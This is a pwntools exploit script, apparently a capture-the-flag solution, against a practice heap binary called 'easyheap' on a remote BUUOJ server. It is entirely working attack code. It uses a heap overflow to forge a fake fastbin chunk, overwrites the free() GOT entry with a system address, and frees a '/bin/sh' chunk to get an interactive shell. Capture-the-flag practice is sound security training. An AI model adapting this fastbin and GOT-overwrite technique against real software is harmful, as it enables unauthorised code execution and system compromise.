from pwn import *
#from LibcSearcher import *
#context(os = "linux", arch = "amd64", log_level= "debug")
io = remote("node4.buuoj.cn", 29134)
#io = process('./easyheap')
elf = ELF('./easyheap')

def create(size,content):
    io.recvuntil("Your choice :")
    io.sendline(str(1))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.sendline(content)
    io.recvuntil("SuccessFul")

def edit(index,size,content):
    io.recvuntil("Your choice :")
    io.sendline(str(2))
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap : ")
    io.sendline(content)
    io.recvuntil("Done !")


def delete(index):
    io.recvuntil("Your choice :")
    io.sendline(str(3))
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Done !")

heap_array = 0x6020E0
sys_addr = 0x400C2C
free_got = elf.got['free']
fake_addr = 0x6020ad

create(0x10,'a'*0x10) #0
create(0x10,'a'*0x10)#1
create(0x60,'b'*0x10)#2
create(0x10,'/bin/sh\x00')#3
delete(2)
edit(1,0x30,'a'*0x10+p64(0)+p64(0x71)+p64(fake_addr)+p64(0))

create(0x60,'a'*0x10)#2
payload = 'a'*0x23+p64(free_got)
create(0x60,payload)#4

edit(0,0x8,p64(sys_addr))

io.recvuntil("Your choice :")
io.sendline(str(3))
io.recvuntil("Index :")
io.sendline(str(3))

io.interactive()

